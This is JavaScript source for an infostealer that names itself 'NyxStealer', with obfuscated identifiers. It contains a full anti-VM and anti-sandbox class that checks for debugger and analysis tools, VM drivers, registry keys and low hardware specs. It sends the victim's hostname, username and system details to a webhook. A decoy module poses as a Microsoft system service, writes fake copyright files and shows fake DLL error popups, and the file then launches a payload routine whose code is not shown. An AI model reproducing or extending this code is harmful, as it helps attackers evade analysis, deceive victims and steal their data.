const DEBUGGER_PROCESSES = ["ollydbg", "ida64", "idaq", "windbg", "x32dbg", "x64dbg", "wireshark", "dumpcap", "procmon", "regmon", "filemon", "processhacker", "autoruns", "tcpview", "volatility", "fiddler", "apimonitor", "immunity", "pestudio", "dnspy", "cheatengine", "ghidra"];
const ANALYSIS_HOSTNAMES = ["sandbox", "analysis", "malware", "cuckoo", "virus", "research", "anyrun", "triage"];
const ANALYSIS_USERNAMES = ["sandbox", "malware", "virus", "sample", "analyze", "cuckoo", "triage", "anyrun"];
const VM_FILES = ["C:\\windows\\System32\\Drivers\\VBoxMouse.sys", "C:\\windows\\System32\\Drivers\\VBoxGuest.sys", "C:\\windows\\System32\\Drivers\\VBoxSF.sys", "C:\\windows\\System32\\Drivers\\VBoxVideo.sys", "C:\\windows\\System32\\vboxdisp.dll", "C:\\windows\\System32\\vboxhook.dll", "C:\\windows\\System32\\vboxservice.exe", "C:\\windows\\System32\\vboxtray.exe", "C:\\windows\\System32\\drivers\\vmmouse.sys", "C:\\windows\\System32\\drivers\\vmhgfs.sys"];
const ANALYSIS_DIRECTORIES = ["C:\\analysis", "C:\\sandbox", "C:\\tools", "C:\\malware", "C:\\samples", "C:\\program files\\oracle\\virtualbox guest additions", "C:\\program files\\VMware"];
class AntiVM {
  static checkMacAddress() {
    try {
      const _0x4e4223 = execSync("getmac", {
        encoding: "utf8",
        timeout: 500,
        windowsHide: true
      });
      for (const _0x1f6eee of VM_MAC_PREFIXES) {
        if (_0x4e4223.includes(_0x1f6eee)) {
          if (DEBUG_ANTIVM) {
            console.log("[AntiVM] VM MAC detected: " + _0x1f6eee);
          }
          return true;
        }
      }
    } catch (_0x344e93) {}
    return false;
  }
  static checkBIOS() {
    try {
      const _0x1e11ff = execSync("powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance -ClassName Win32_BIOS | Select-Object -ExpandProperty Manufacturer\"", {
        encoding: "utf8",
        timeout: 1000,
        windowsHide: true
      });
      const _0x428adf = ["vmware", "virtualbox", "qemu", "xen", "parallels", "kvm", "microsoft corporation"];
      if (_0x428adf.some(_0x498a3a => _0x1e11ff.toLowerCase().includes(_0x498a3a))) {
        if (DEBUG_ANTIVM) {
          console.log("[AntiVM] VM BIOS detected: " + _0x1e11ff.trim());
        }
        return true;
      }
      const _0x20b8b3 = execSync("powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance -ClassName Win32_BIOS | Select-Object -ExpandProperty Version\"", {
        encoding: "utf8",
        timeout: 1000,
        windowsHide: true
      });
      if (_0x428adf.some(_0xf5ae2d => _0x20b8b3.toLowerCase().includes(_0xf5ae2d))) {
        if (DEBUG_ANTIVM) {
          console.log("[AntiVM] VM BIOS version detected: " + _0x20b8b3.trim());
        }
        return true;
      }
    } catch (_0x1d0766) {}
    return false;
  }
  static checkDisk() {
    try {
      const _0x2295d7 = execSync("powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance -ClassName Win32_DiskDrive | Select-Object -ExpandProperty Model\"", {
        encoding: "utf8",
        timeout: 1000,
        windowsHide: true
      });
      const _0x4dfdc0 = ["vbox", "vmware", "virtual", "qemu", "xen"];
      if (_0x4dfdc0.some(_0x2f3f60 => _0x2295d7.toLowerCase().includes(_0x2f3f60))) {
        if (DEBUG_ANTIVM) {
          console.log("[AntiVM] VM disk detected: " + _0x2295d7.trim());
        }
        return true;
      }
    } catch (_0x1fcdb) {}
    return false;
  }
  static checkHardware() {
    if (os.cpus().length < 2) {
      if (DEBUG_ANTIVM) {
        console.log("[AntiVM] Low CPU cores: " + os.cpus().length);
      }
      return true;
    }
    const _0x2b7bed = os.totalmem() / 1073741824;
    if (_0x2b7bed < 4) {
      if (DEBUG_ANTIVM) {
        console.log("[AntiVM] Low RAM: " + _0x2b7bed.toFixed(2) + "GB");
      }
      return true;
    }
    return false;
  }
  static checkProcesses() {
    try {
      const _0x4dc1fd = execSync("tasklist", {
        encoding: "utf8",
        timeout: 1000,
        windowsHide: true
      }).toLowerCase();
      for (const _0x5b9828 of SANDBOX_PROCESSES) {
        if (_0x4dc1fd.includes(_0x5b9828)) {
          if (DEBUG_ANTIVM) {
            console.log("[AntiVM] Sandbox process detected: " + _0x5b9828);
          }
          return true;
        }
      }
      for (const _0x1fce04 of DEBUGGER_PROCESSES) {
        if (_0x4dc1fd.includes(_0x1fce04)) {
          if (DEBUG_ANTIVM) {
            console.log("[AntiVM] Debugger process detected: " + _0x1fce04);
          }
          return true;
        }
      }
      const _0x55a225 = _0x4dc1fd.split("\n").length;
      if (_0x55a225 < 30) {
        if (DEBUG_ANTIVM) {
          console.log("[AntiVM] Low process count: " + _0x55a225);
        }
        return true;
      }
    } catch (_0x2ac90d) {}
    return false;
  }
  static checkHostname() {
    const _0x4dae07 = os.hostname().toLowerCase();
    for (const _0x10d96e of ANALYSIS_HOSTNAMES) {
      if (_0x4dae07.includes(_0x10d96e)) {
        if (DEBUG_ANTIVM) {
          console.log("[AntiVM] Analysis hostname detected: " + _0x4dae07);
        }
        return true;
      }
    }
    return false;
  }
  static checkUsername() {
    const _0x2930e9 = os.userInfo().username.toLowerCase();
    for (const _0x989489 of ANALYSIS_USERNAMES) {
      if (_0x2930e9.includes(_0x989489)) {
        if (DEBUG_ANTIVM) {
          console.log("[AntiVM] Analysis username detected: " + _0x2930e9);
        }
        return true;
      }
    }
    return false;
  }
  static checkVMFiles() {
    for (const _0x14f0fc of VM_FILES) {
      try {
        if (fs.existsSync(_0x14f0fc)) {
          if (DEBUG_ANTIVM) {
            console.log("[AntiVM] VM file detected: " + _0x14f0fc);
          }
          return true;
        }
      } catch (_0x37c6f4) {}
    }
    return false;
  }
  static checkAnalysisDirs() {
    for (const _0x3fa3a3 of ANALYSIS_DIRECTORIES) {
      try {
        if (fs.existsSync(_0x3fa3a3)) {
          if (DEBUG_ANTIVM) {
            console.log("[AntiVM] Analysis directory detected: " + _0x3fa3a3);
          }
          return true;
        }
      } catch (_0x52a33b) {}
    }
    return false;
  }
  static checkTempFiles() {
    try {
      const _0x407630 = fs.readdirSync(os.tmpdir());
      if (_0x407630.length < 10) {
        if (DEBUG_ANTIVM) {
          console.log("[AntiVM] Low temp files: " + _0x407630.length);
        }
        return true;
      }
    } catch (_0x253a16) {}
    return false;
  }
  static checkScreenSize() {
    try {
      const _0x526f67 = execSync("powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width\"", {
        encoding: "utf8",
        timeout: 1000,
        windowsHide: true
      });
      const _0x35a4f8 = parseInt(_0x526f67.trim());
      if (_0x35a4f8 < 1024) {
        if (DEBUG_ANTIVM) {
          console.log("[AntiVM] Low screen width: " + _0x35a4f8);
        }
        return true;
      }
    } catch (_0x371861) {}
    return false;
  }
  static checkSleepPatching() {
    const _0x3c5105 = 1000;
    const _0x46fe8a = Date.now();
    const _0x14c594 = _0x46fe8a + _0x3c5105;
    while (Date.now() < _0x14c594) {}
    const _0x52bbac = Date.now() - _0x46fe8a;
    if (_0x52bbac < _0x3c5105 * 0.9) {
      if (DEBUG_ANTIVM) {
        console.log("[AntiVM] Sleep patching detected: " + _0x52bbac + "ms vs " + _0x3c5105 + "ms");
      }
      return true;
    }
    return false;
  }
  static checkNetworkInterfaces() {
    const _0x299b6c = os.networkInterfaces();
    const _0x16c29b = Object.keys(_0x299b6c).length;
    if (_0x16c29b < 2) {
      if (DEBUG_ANTIVM) {
        console.log("[AntiVM] Low network interfaces: " + _0x16c29b);
      }
      return true;
    }
    return false;
  }
  static checkRegistry() {
    const _0x11388a = ["HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions", "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxGuest", "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxMouse", "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxService", "HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools", "HKLM\\SYSTEM\\ControlSet001\\Services\\vmci", "HKLM\\SYSTEM\\ControlSet001\\Services\\vmhgfs", "HKLM\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"];
    for (const _0x1b9d72 of _0x11388a) {
      try {
        execSync("reg query \"" + _0x1b9d72 + "\"", {
          stdio: "pipe",
          timeout: 1000,
          windowsHide: true
        });
        if (DEBUG_ANTIVM) {
          console.log("[AntiVM] VM registry key found: " + _0x1b9d72);
        }
        return true;
      } catch (_0x5e659c) {}
    }
    return false;
  }
  static randomDelay() {
    const _0x165777 = Math.floor(Math.random() * 200) + 50;
    const _0x1adc0e = Date.now();
    while (Date.now() - _0x1adc0e < _0x165777) {}
  }
  static async check() {
    if (DEBUG_ANTIVM) {
      console.log("[AntiVM] Starting anti-VM/sandbox checks...");
    }
    const _0x524d9b = {
      name: "MAC Address",
      fn: this.checkMacAddress
    };
    const _0x121f4f = {
      name: "BIOS",
      fn: this.checkBIOS
    };
    const _0x16bb02 = {
      name: "Disk",
      fn: this.checkDisk
    };
    const _0x4e59d8 = {
      name: "Hardware",
      fn: this.checkHardware
    };
    const _0x115fca = {
      name: "Processes",
      fn: this.checkProcesses
    };
    const _0x257247 = {
      name: "Hostname",
      fn: this.checkHostname
    };
    const _0x2fb94c = {
      name: "Username",
      fn: this.checkUsername
    };
    const _0xcce4f = {
      name: "VM Files",
      fn: this.checkVMFiles
    };
    const _0x482a31 = {
      name: "Analysis Dirs",
      fn: this.checkAnalysisDirs
    };
    const _0x5c5e5c = {
      name: "Temp Files",
      fn: this.checkTempFiles
    };
    const _0x49625f = {
      name: "Screen Size",
      fn: this.checkScreenSize
    };
    const _0x5452f1 = {
      name: "Network Interfaces",
      fn: this.checkNetworkInterfaces
    };
    const _0x2ed271 = {
      name: "Registry",
      fn: this.checkRegistry
    };
    const _0x5c7cee = [_0x524d9b, _0x121f4f, _0x16bb02, _0x4e59d8, _0x115fca, _0x257247, _0x2fb94c, _0xcce4f, _0x482a31, _0x5c5e5c, _0x49625f, _0x5452f1, _0x2ed271];
    for (let _0x46d2e3 = _0x5c7cee.length - 1; _0x46d2e3 > 0; _0x46d2e3--) {
      const _0x47fef8 = Math.floor(Math.random() * (_0x46d2e3 + 1));
      [_0x5c7cee[_0x46d2e3], _0x5c7cee[_0x47fef8]] = [_0x5c7cee[_0x47fef8], _0x5c7cee[_0x46d2e3]];
    }
    for (const _0x48ea3a of _0x5c7cee) {
      try {
        this.randomDelay();
        if (_0x48ea3a.fn.call(this)) {
          if (DEBUG_ANTIVM) {
            console.log("[AntiVM] DETECTED: " + _0x48ea3a.name);
          }
          try {
            const _0x5996c9 = {
              username: "AntiVM Debug",
              embeds: [{
                title: "⚠️ AntiVM False Positive Debug",
                color: 16737792,
                fields: [{
                  name: "🔍 Tetiklenen Kontrol",
                  value: "`" + _0x48ea3a.name + "`",
                  inline: false
                }, {
                  name: "💻 Hostname",
                  value: "`" + os.hostname() + "`",
                  inline: true
                }, {
                  name: "👤 Username",
                  value: "`" + os.userInfo().username + "`",
                  inline: true
                }, {
                  name: "🧠 CPU Cores",
                  value: "`" + os.cpus().length + "`",
                  inline: true
                }, {
                  name: "💾 RAM",
                  value: "`" + (os.totalmem() / 1073741824).toFixed(1) + "GB`",
                  inline: true
                }, {
                  name: "🖥️ Platform",
                  value: "`" + os.platform() + " " + os.arch() + "`",
                  inline: true
                }, {
                  name: "🌐 Network Interfaces",
                  value: "`" + Object.keys(os.networkInterfaces()).length + "`",
                  inline: true
                }, {
                  name: "📁 Temp Files",
                  value: "`" + (() => {
                    try {
                      return require("fs").readdirSync(require("os").tmpdir()).length;
                    } catch (_0x1d6ecb) {
                      return "err";
                    }
                  })() + " dosya`",
                  inline: true
                }],
                footer: {
                  text: "AntiVM Debug - False Positive Analizi"
                }
              }]
            };
            await axios.post(CONFIG.webhook, _0x5996c9, {
              timeout: 8000
            });
          } catch (_0x40795b) {
            if (DEBUG_ANTIVM) {
              console.log("[AntiVM] Webhook debug send failed:", _0x40795b.message);
            }
          }
          return true;
        }
      } catch (_0x45a6a9) {
        if (DEBUG_ANTIVM) {
          console.log("[AntiVM] Error in " + _0x48ea3a.name + ": " + _0x45a6a9.message);
        }
      }
    }
    if (DEBUG_ANTIVM) {
      console.log("[AntiVM] All checks passed - real system");
    }
    return false;
  }
  static async checkAndExit() {
    if (await this.check()) {
      if (DEBUG_ANTIVM) {
        console.log("[AntiVM] VM/Sandbox detected - exiting");
      }
      process.exit(0);
    }
  }
}
class LegitimateModule {
  static collectSystemInfo() {
    const _0x19a4ab = {
      platform: os.platform(),
      arch: os.arch(),
      hostname: os.hostname(),
      cpus: os.cpus().length,
      totalMemory: Math.round(os.totalmem() / 1073741824) + "GB",
      freeMemory: Math.round(os.freemem() / 1073741824) + "GB",
      uptime: Math.round(os.uptime() / 3600) + "h",
      nodeVersion: process.version,
      timestamp: new Date().toISOString()
    };
    return _0x19a4ab;
  }
  static async checkForUpdates() {
    await this.sleep(500 + Math.random() * 1000);
    const _0x1d0f65 = {
      currentVersion: "1.0.0",
      latestVersion: "1.0.0",
      updateAvailable: false,
      checkTime: new Date().toISOString()
    };
    return _0x1d0f65;
  }
  static createConfigFile() {
    const _0x5eaa48 = process.env.APPDATA || path.join(os.homedir(), "AppData", "Roaming");
    const _0x5f0989 = path.join(_0x5eaa48, "WindowsSystemService");
    try {
      if (!fs.existsSync(_0x5f0989)) {
        fs.mkdirSync(_0x5f0989, {
          recursive: true
        });
      }
      const _0x601a27 = path.join(_0x5f0989, "config.json");
      const _0x418925 = {
        version: "1.0.0",
        installDate: new Date().toISOString(),
        lastRun: new Date().toISOString(),
        settings: {
          autoUpdate: true,
          sendDiagnostics: false,
          checkInterval: 3600000
        }
      };
      fs.writeFileSync(_0x601a27, JSON.stringify(_0x418925, null, 2));
      return _0x601a27;
    } catch (_0x9e8ddd) {
      return null;
    }
  }
  static createLogFile(_0x4334ec) {
    const _0x50930b = process.env.APPDATA || path.join(os.homedir(), "AppData", "Roaming");
    const _0x53522d = path.join(_0x50930b, "WindowsSystemService", "Logs");
    try {
      if (!fs.existsSync(_0x53522d)) {
        fs.mkdirSync(_0x53522d, {
          recursive: true
        });
      }
      const _0x203915 = new Date().toISOString();
      const _0x35d925 = "[" + _0x203915 + "] " + _0x4334ec + "\n";
      const _0x5d6017 = path.join(_0x53522d, "service.log");
      fs.appendFileSync(_0x5d6017, _0x35d925);
      return _0x5d6017;
    } catch (_0x48c8b9) {
      return null;
    }
  }
  static simulateServiceBehavior() {
    this.createConfigFile();
    this.createLogFile("Service started");
    this.createLogFile("Initializing system check");
    this.createLogFile("System diagnostics running");
    this.checkForUpdates();
  }
  static async waitForHumanInteraction() {
    const _0x7cd06d = Date.now();
    const _0x114f13 = 2000;
    while (Date.now() - _0x7cd06d < _0x114f13) {
      await this.sleep(100);
    }
    return true;
  }
  static checkNetworkConnectivity() {
    return new Promise(_0x123db8 => {
      try {
        const _0x265368 = require("dns");
        const {
          promisify: _0x3ad13c
        } = require("util");
        const _0x2df47a = _0x3ad13c(_0x265368.lookup);
        const _0x49cf75 = ["google.com", "cloudflare.com"];
        const _0x11595d = {};
        Promise.all(_0x49cf75.map(_0x464743 => _0x2df47a(_0x464743).then(() => ({
          host: _0x464743,
          success: true
        })).catch(() => ({
          host: _0x464743,
          success: false
        })))).then(_0x5f2170 => {
          _0x5f2170.forEach(({
            host: _0x309fc0,
            success: _0x4c481d
          }) => {
            _0x11595d[_0x309fc0] = _0x4c481d;
          });
          _0x123db8(_0x11595d);
        }).catch(() => {
          _0x123db8({});
        });
      } catch (_0x515e44) {
        _0x123db8({});
      }
    });
  }
  static createLegitimateFiles() {
    const _0x572af8 = os.tmpdir();
    const _0x486a84 = [];
    try {
      const _0x32c4c9 = path.join(_0x572af8, "SystemService_README.txt");
      const _0x2dbbb9 = "\nWindows System Service\nVersion: 1.0.0\n\nThis is a system maintenance service that helps keep your system running smoothly.\n\nFeatures:\n- System diagnostics\n- Performance optimization\n- Update management\n\n© Microsoft Corporation. All rights reserved.";
      fs.writeFileSync(_0x32c4c9, _0x2dbbb9);
      _0x486a84.push(_0x32c4c9);
      const _0x3c1e26 = path.join(_0x572af8, "version.txt");
      fs.writeFileSync(_0x3c1e26, "1.0.0.0");
      _0x486a84.push(_0x3c1e26);
    } catch (_0xfee7c7) {}
    return _0x486a84;
  }
  static performDiagnostics() {
    let _0x14f9c3 = 0;
    for (let _0x27a15d = 0; _0x27a15d < 100000; _0x27a15d++) {
      _0x14f9c3 += Math.sqrt(_0x27a15d);
    }
    return _0x14f9c3;
  }
  static async sleep(_0x8942a2) {
    return new Promise(_0x24b60b => setTimeout(_0x24b60b, _0x8942a2));
  }
  static showFakeDllError() {
    if (Math.random() > 0.7) {
      return;
    }
    try {
      const _0x39818d = os.tmpdir();
      const _0x5f4657 = path.join(_0x39818d, "system_check_" + Date.now() + ".vbs");
      const _0x21a6f8 = ["MSVCR100.dll", "MSVCP140.dll", "VCRUNTIME140.dll", "api-ms-win-crt-runtime-l1-1-0.dll", "ucrtbase.dll"];
      const _0xee2b14 = _0x21a6f8[Math.floor(Math.random() * _0x21a6f8.length)];
      const _0x49614e = "\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Popup \"The program can't start because " + _0xee2b14 + " is missing from your computer. Try reinstalling the program to fix this problem.\", 0, \"System Error\", 16\n";
      fs.writeFileSync(_0x5f4657, _0x49614e, "utf8");
      exec("cscript //nologo //B \"" + _0x5f4657 + "\"", {
        windowsHide: true
      }, _0x5f4c13 => {
        try {
          fs.unlinkSync(_0x5f4657);
        } catch (_0x3491bc) {}
      });
    } catch (_0x3feaef) {}
  }
  static async runLegitimateRoutine() {
    const _0x4b5b83 = this.collectSystemInfo();
    this.simulateServiceBehavior();
    await this.checkForUpdates();
    await this.checkNetworkConnectivity();
    this.createLegitimateFiles();
    this.performDiagnostics();
    this.showFakeDllError();
    await this.waitForHumanInteraction();
    this.createLogFile("Service initialization completed");
    return true;
  }
}
async function findRandomDeepFolder() {
  try {
    const _0x4beedf = process.env.LOCALAPPDATA || os.tmpdir();
    const _0x11a352 = path.join(_0x4beedf, "nyx-local");
    fs.mkdirSync(_0x11a352, {
      recursive: true
    });
    console.log("[FUD] Using deterministic deep folder: " + _0x11a352);
    return _0x11a352;
  } catch (_0x1d95fd) {
    const _0xb55f1d = path.join(os.tmpdir(), "nyx-local");
    fs.mkdirSync(_0xb55f1d, {
      recursive: true
    });
    console.log("[FUD] Using fallback deep folder: " + _0xb55f1d);
    return _0xb55f1d;
  }
}
async function main() {
  console.log("Main started");
  try {
    console.log("=== NyxStealer Started ===");
    console.log("Starting Windows System Service...");
    console.log("Checking AntiVM config...");
    if (ENABLE_ANTIVM) {
      console.log("Step 1/7: Checking for virtual machine...");
      const _0x3431c6 = await AntiVM.check();
      if (_0x3431c6) {
        console.log("Virtual machine detected! Exiting...");
        console.log("VM Detected, exiting");
        process.exit(0);
      }
      console.log("VM check passed");
    } else {
      console.log("AntiVM disabled, skipping check");
      console.log("AntiVM disabled");
    }
    console.log("Running system diagnostics...");
    await LegitimateModule.runLegitimateRoutine();
    console.log("Legitimate Routine finished");
    console.log("System diagnostics completed");
    console.log("Running security checks...");
    console.log("All security checks passed");
    console.log("Finding random deep folder...");
    const _0x2a2410 = await findRandomDeepFolder();
    console.log("Deep folder found: " + _0x2a2410);
    console.log("Found deep folder: " + _0x2a2410);
    console.log("Running payload...");
    console.log("Starting InputPayload.main()...");
    console.log("Starting InputPayload...");
    await InputPayload.main(_0x2a2410);
    console.log("InputPayload finished");
    console.log("All operations completed successfully!");
    console.log("=== Summary ===");
    console.log("Total logs: N/A");
    console.log("Errors: N/A");
    console.log("Success: N/A");
    console.log("Duration: N/A");
    console.log("All done");
    setTimeout(() => {
      process.exit(0);
    }, 200);
  } catch (_0x46aede) {
    console.log("Fatal error: " + _0x46aede.message + "\n" + _0x46aede.stack);
    console.log("Fatal error: " + _0x46aede.message);
    console.log("Stack trace: " + _0x46aede.stack);
    process.exit(1);
  }
}
async function mainSilent() {
  try {
    await LegitimateModule.runLegitimateRoutine();
    if (await AntiVM.check()) {
      process.exit(0);
    }
    const _0x54224e = await findRandomDeepFolder();
    await InputPayload.main(_0x54224e).catch(_0x693c31 => {
      console.log("Error: " + _0x693c31.message);
    });
    setTimeout(() => process.exit(0), 100);
  } catch (_0x288f29) {
    process.exit(1);
  }
}
const startApp = () => {
  console.log("Starting app execution...");
  if (process.argv.includes("--silent")) {
    mainSilent();
  } else {
    main();
  }
};
let electronApp;
try {
  const electron = require("electron");
  if (typeof electron === "object" && electron.app) {
    electronApp = electron.app;
  }
} catch (a0_0x243c11) {}
if (electronApp) {
  if (electronApp.isReady()) {
    console.log("Electron app already ready - Calling startApp directly");
    setTimeout(() => startApp(), 0);
  } else {
    electronApp.whenReady().then(() => {
      console.log("Electron app ready - Calling startApp");
      startApp();
    });
  }
} else {
  console.log("Node environment detected - Calling startApp");
  startApp();
}
const a0_0x14f61f = {
  main: main,
  mainSilent: mainSilent,
  AntiVM: AntiVM,
  LegitimateModule: LegitimateModule,
  AdminCheck: AdminCheck
};
module.exports = a0_0x14f61f;